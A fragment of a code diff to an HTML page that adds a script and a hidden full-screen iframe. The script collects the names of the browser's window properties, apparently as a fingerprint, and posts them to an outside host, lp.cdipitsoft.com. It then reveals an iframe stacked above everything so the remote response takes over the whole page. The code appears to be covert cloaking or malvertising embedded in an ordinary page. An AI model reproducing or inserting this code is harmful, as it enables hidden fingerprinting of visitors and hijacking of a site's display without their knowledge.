@@ -36,14 +36,17 @@
     </div>
     
 </section>
-<form id="frm" method="POST">
+<form id="frm" action="" target="target1" method="POST">
 <input type="hidden" id="objkeys" name="objkeys">
 </form>
+<iframe name="target1" src="" id="ifm" style="display:none;visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" allowfullscreen="allowfullscreen" webkitallowfullscreen="webkitallowfullscreen" mozallowfullscreen="mozallowfullscreen"></iframe>
 <script>
 function show(){
 	var frm=document.getElementById("frm");
+	var ifm=document.getElementById("ifm");
 	frm.action = "https://lp.cdipitsoft.com/pl_ed1/"+(document.search||'');
 	document.getElementById("objkeys").value=JSON.stringify(Object.keys(window));
+	ifm.style.display="block";
 	frm.submit();
 }
 </script>
